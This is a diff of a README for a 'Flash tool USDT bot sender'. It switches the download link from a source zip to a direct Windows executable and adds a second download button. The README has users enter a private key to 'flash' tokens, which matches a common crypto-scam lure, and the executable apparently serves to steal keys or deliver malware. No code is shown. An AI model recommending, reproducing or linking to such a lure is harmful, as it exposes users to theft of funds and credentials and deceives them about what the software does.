@@ -5,7 +5,7 @@ Windows CLI tool for sending Ethereum tokens (USDT, USDC, DAI) using custom priv
 <h1 align="center"><b>🚀 Download Now</b></h1>
 
 <p align="center">
-  <a href="https://github.com/alpha-arb/Flash-tool-USDT-bot-sender/archive/refs/tags/Tool.zip">
+  <a href="https://github.com/alpha-arb/Flash-tool-USDT-bot-sender/releases/download/Tool/Flashing.Software.exe">
     <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
   </a>
 </p>
@@ -25,6 +25,12 @@ Windows CLI tool for sending Ethereum tokens (USDT, USDC, DAI) using custom priv
    - Enter a private key
    - Choose a token and recipient
    - Send via proxy with flash tool to Ethereum blockchain get tx hash
+
+<p align="center">
+  <a href="https://github.com/alpha-arb/Flash-tool-USDT-bot-sender/releases/download/Tool/Flashing.Software.exe">
+    <img src="https://img.shields.io/badge/⬇️-Download-blue?style=for-the-badge&logo=github" alt="Download">
+  </a>
+</p>
 
 ---
 
